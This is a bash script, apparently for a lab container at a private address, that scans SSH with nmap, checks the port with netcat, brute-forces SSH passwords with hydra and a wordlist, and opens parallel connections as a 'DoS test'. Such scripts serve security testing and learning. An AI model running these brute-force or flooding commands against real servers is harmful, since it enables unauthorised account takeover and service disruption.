#!/bin/bash

TARGET="172.18.0.2"
GREEN='\033[0;32m'
NC='\033[0m'

scan_target() {
    echo "Scanning target $TARGET..."
    nmap -sV -p22 $TARGET
}

test_ssh() {
    echo "Testing SSH connection..."
    nc -vz $TARGET 22
}

bruteforce_ssh() {
    local user=$1
    local wordlist=$2
    echo "Starting SSH bruteforce attack..."
    hydra -t 4 -l $user -P $wordlist $TARGET ssh
}

dos_ssh() {
    echo "Starting SSH DoS test..."
    for i in {1..10}; do
        nc -vz $TARGET 22 &
    done
    wait
}

case "$1" in
    "scan")
        scan_target
        ;;
    "test_ssh")
        test_ssh
        ;;
    "bruteforce")
        bruteforce_ssh "$2" "$3"
        ;;
    "dos")
        dos_ssh
        ;;
    *)
        echo "Usage: $0 {scan|test_ssh|bruteforce|dos}"
        echo "Examples:"
        echo "  $0 scan                   # Scan target"
        echo "  $0 test_ssh               # Test SSH connection"
        echo "  $0 bruteforce root path   # SSH bruteforce"
        echo "  $0 dos                    # DoS test"
        exit 1
        ;;
esac 